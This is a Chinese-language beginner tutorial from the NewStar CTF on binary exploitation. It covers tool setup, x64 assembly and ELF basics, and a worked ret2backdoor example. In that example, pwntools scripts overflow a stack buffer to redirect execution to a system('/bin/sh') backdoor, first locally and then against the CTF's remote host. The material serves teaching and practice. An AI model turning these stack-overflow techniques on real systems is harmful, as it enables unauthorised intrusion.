---
titleTemplate: ':title | 快速入门 - NewStar CTF'
---
<script setup>
import Container from '@/components/docs/Container.vue'
import { ElTag } from 'element-plus'
import 'element-plus/es/components/tag/style/css'

</script>

# Pwn

## 0xFF. Pwn 是干什么的？好吃🐎？

<Container type='tip'>
Pwn 是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似「砰」，对黑客而言，这就是成功实施黑客攻击的声音——「砰」的一声，被「黑」的电脑或手机就被你操纵了。
<div style="display: inline-block; width: 100%; text-align: right;">——百度百科</div>
</Container>

Pwn 需要的不仅是基本的 C语言、汇编语言以及逆向功底，还有程序运行相关的知识。

## 0x00. 解决 Pwn 题目的基本流程

题目附件会提供可执行文件，需要使用 IDA、Ghidra 等反汇编工具对其进行静态分析，找到其中存在的漏洞。

之后将程序在本地运行，经过动态调试分析，写出攻击脚本，本地拿到一定权限之后就可以进行远程的攻击了。

::: tip
攻击脚本一般使用 Python 配合一些工具库进行编写较为方便，你需要掌握 Python 的数据类型、函数等基础知识。
:::

## 0x01. Pwn 环境搭建

- Ubuntu（建议用近几年的 Ubuntu，比如 22.04 LTS, 24.04 LTS）
- IDA/Ghidra
- pwntools
- gdb 及其插件
- ROPgadget
- one_gadget

::: info
下载传送门：[IDA Pro 8.3](https://down.52pojie.cn/Tools/Disassemblers/IDA_Pro_v8.3_Portable.zip)
:::

对于 Pwn 环境搭建，可参考文章：[Pwn 22.04 环境搭建保姆级教程](https://blog.csdn.net/j284886202/article/details/134931709)。

除此之外还建议在 Ubuntu 装个趁手的代码编辑器，如 [VSCode](https://visualstudio.microsoft.com/).

::: tip
由于国内网络环境，使用 Pip 等包管理工具时可能遇到下载缓慢、无法下载等情况，可自行网络搜索配置镜像源。

如 Pip 镜像配置可参照 [清华大学软件源 PyPI](https://mirror.tuna.tsinghua.edu.cn/help/pypi/).

:::


## 0x02. 前期 Pwn 的基本学习路线

首先前置知识有基础的 C 语言、汇编、ELF 程序的加载运行知识

前置 C 语言知识：

- 程序结构、基础语法
- 数据类型、变量、常量 以及 变量作用域
- 运算符
- `if` `switch` 分支语句、`for` `while` `do while` 循环
- 函数和变量生命周期
- 数组与指针、函数指针
- 字符串
- 结构体
- 输入输出
- 文件读写
- 强制类型转换

前置汇编知识：

- 寄存器
- x64 汇编基础语法
- 内存寻址
- 函数调用以及栈帧变化
- 中断

ELF 相关知识：

- ELF 文件的结构：ELF每个段的作用、保护等
- 程序的加载、动态链接、静态链接
- ELF 程序的保护（Canary、PIE、RELRO、NX）

Pwn 知识：

- ret2text/ret2backdoor
- 整数溢出
- ROP
- 静态链接与动态链接
- ret2libc
- shellcode 编写与 ret2shellcode
- ret2syscall
- ret2dl_resolve
- 格式化字符串漏洞
- 伪随机数漏洞
- 栈迁移
- one_gadget


## 0x03. Pwn 基础

### x64 汇编部分

#### 寄存器

一个比较容易理解的方法就是把寄存器当作 C 语言中的变量，寄存器的顺序都是有规律的。

例如，`r` 开头的为 64 位寄存器（看作 `unsigned long long`），如

- `rax` `rbx` `rcx` `rdx` `rdi` `rsi` `rsp` `rbp` `rip`
- `r8` `r9` `r10` `r11` `r12` `r13` `r14` `r15`.

例如，`e` 开头的是 32 位寄存器（看作 `unsigned int`），如

- `eax` `ebx` `ecx` `edx` `edi` `esi` `esp` `ebp` `eip`.

其中 `eax` 是 `rax` 的低 4 字节，其它的以此类推。

#### 数据类型

- <ElTag type="info" size="small">1 字节</ElTag> `BYTE`
- <ElTag type="info" size="small">2 字节</ElTag> `WORD`
- <ElTag type="info" size="small">4 字节</ElTag> `DWORD`
- <ElTag type="info" size="small">8 字节</ElTag> `QWORD`

#### 基础汇编语句

以下是 Intel 格式汇编语句的例子：

```asm
mov rax, 1           ; 将 rax 的值赋值为 1
mov rax, rdi         ; 将 rdi 存储的值赋值给 rax
mov rax, [0x404000]  ; 将 0x404000 存储的内容复制到 rax 里面
mov [rdx], rax       ; 将 rax 的值存储到 rdx 存储的指针指向的地方
```

除此之外比较类似的还有 `add` `sub` 等指令。

```asm
lea  rax, [rdx+0x10] ; 将 rdx+0x10 指针赋值给 rax
push rax             ; 将 rax 的值 push 到栈上面。
pop  rax             ; 将栈顶的值 pop 到 rax 寄存器里面。
```

### ELF 相关知识

#### ELF 结构

ELF 文件每个部分都是分段的。

IDA中，按下 <kbd>⇧Shift</kbd><kbd>F7</kbd> 即可查看

几个比较重要的段（Section）的作用：

- `.text` 段：存储程序的代码，具有可读可执行权限，不可写
- `.bss` 段：存储没有赋初值的全局变量，可读可写
- `.data` 段：存储已经赋初值的全局变量，可读可写
- `.rodata` 段：存储全局常量，比如常量字符串等，仅仅可读

## 0x04. Pwn 题目解题示例

我们以一个 ret2backdoor 的题目为例子。

### 题目相关

靶机连接：

```bash
nc hacker.akyuu.space 6000
```

[附件下载](https://platform.akyuu.space/training/0.zip)

### 题目分析以及解题

首先下载下来附件并且解压，得到文件 `pwn`.

将其复制进虚拟机并且当前文件夹打开终端，给予文件可执行权限。

```bash
chmod +x ./pwn
```

使用 `file` 以及 `checksec` 命令查看文件信息以及保护开启状态。

![Pwn 文件初步探索](/assets/images/learn/pwn-check.png)

用 IDA 打开。

![用 IDA 打开文件](/assets/images/learn/pwn-open-ida.png)

现在显示的就是 `main` 函数的汇编代码，按下 <kbd>F5</kbd>，就可以对当前函数进行反汇编为 C 语言。

最左边一栏就是当前程序的函数列表，双击就可以打开函数查看。

![main 函数](/assets/images/learn/pwn-ida-main.png)

双击函数名称即可查看当前函数的反汇编代码实现。

可以点击 `init` 函数进行查看。因为 `read` 函数是库函数，实现位于 `libc.so.6` 的库中（有些版本文件名是 `libc-?.??.so`）所以点开发现只有一行红色的 `read`.

通过对 `main` 函数反汇编代码我们可以了解到程序的功能就是往 `buf` 里面使用 `read` 函数进行读入（最大长度 `0x100` 字节）。

`buf` 是个局部变量，位于栈中。

我们双击 `buf` 变量就可以查看当前函数的栈帧结构。

![函数帧结构](/assets/images/learn/pwn-stack-frame.png)

我们可以知道当前 `buf` 的长度为 16 字节，并且

- `_QWORD __saved_registers;` 对应的是栈帧存储的 `rbp_old`；
- `_UNKNOWN *__return_address;` 对应当前函数的返回地址处。

我们可以读入的字节长度最长 `0x100` 远大于 16，就导致我们可以修改当前栈帧的 `rbp_old` 以及函数的返回地址，就可以劫持程序的执行流了。

我们发现程序存在 `backdoor` 函数，里面执行的是 `system("/bin/sh")`.

这句代码的功能就是执行 `/bin/sh`，即获取 shell，我们只要能把程序执行流劫持到这里就能拿到 shell 了。

之后我们开始写利用脚本（Exploit）。创建 `exp.py` 文件。

首先写上最基本的框架：

```python
from pwn import *

context.log_level='debug'
context(arch='amd64',os='linux')

ELFpath = './pwn'
p = process(ELFpath)
gdb.attach(p)

p.interactive()
```

我们要往 `buf` 写入的东西就是 16 个随便的字符 + 8 字节的 rbp_old + 8字节的函数返回地址，即 `b'a'*0x10+p64(0) + p64(0x4011BD)`.

这样我们就能更改 `rbp_old` 的数值为 0，更改函数的返回地址到 `0x4011BD`.

然后我们使用 `send` 函数与程序进行交互。

```python
from pwn import *

context.log_level='debug'
context(arch='amd64',os='linux')

ELFpath = './pwn'
p = process(ELFpath)
gdb.attach(p)

p.send(b'a'*0x10 + p64(0) + p64(0x4011BD)) # [!code highlight]

p.interactive()
```

之后在终端运行 `exp.py` 脚本。

![test - 本地利用](/assets/images/learn/pwn-run-exp-local_test.png)

可以看到我们已经成功运行了，而且通过 `gdb.attach()` 成功开启 gdb 进行调试。

下面是 gdb/pwndbg 常用的命令：

- `ni`: 执行到当前函数的下一条汇编指令
- `si`: 单步步入，和 `ni` 的区别就是 call<span class='desc-text'>（调用）</span>函数的时候会一步步进入所 call 的函数，而不是像 `ni` 那样直接跳过
- `fin`: 执行至当前函数结束
- `q`: 退出gdb
- `vmmap`: 查看当前内存中的每个段的信息
- `tele 0x????`: 查看地址为 `0x????` 的内存中存储的内容

![backdoor - 本地利用](/assets/images/learn/pwn-run-exp-local_backdoor.png)

我们执行到 `main` 函数结束的地方，就可以看到我们成功劫持程序的执行流到 `backdoor` 函数。

![system - 本地利用](/assets/images/learn/pwn-run-exp-local_system.png)

但是程序卡在了system函数的内部的一条命令:

```asm
0x7e3aee45842b <do_system+363>    movaps xmmword ptr [rsp + 0x50], xmm0
```

这个命令涉及到 `xmm` 寄存器，`xmm` 寄存器为 128 位，需要 `rsp+0x50` 的最低一个 16 进制位为 `0`.

一个可行的应对方法就是我们可以劫持程序的执行流到 `0x4011C2` 处，这样就能跳过一个 `push` 命令，`rsp` 自然就多了 8，就满足了 `xmm` 寄存器的要求。

修改一下地址就能拿到 shell 了

```python
from pwn import *

context.log_level='debug'
context(arch='amd64',os='linux')

ELFpath = './pwn'
p = process(ELFpath)
gdb.attach(p)

p.send(b'a'*0x10 + p64(0) + p64(0x4011C2)) # [!code focus]

p.interactive()
```

![本地利用后门成功](/assets/images/learn/pwn-run-exp-local_success.png)

之后注释掉 `process` 函数与 `gdb.attach` 函数，换 `remote` 函数打远程靶机即可：

```python
p = remote('hacker.akyuu.space', 6000)
```

![远程利用后门成功](/assets/images/learn/pwn-run-exp-remote_success.png)

远程利用成功。
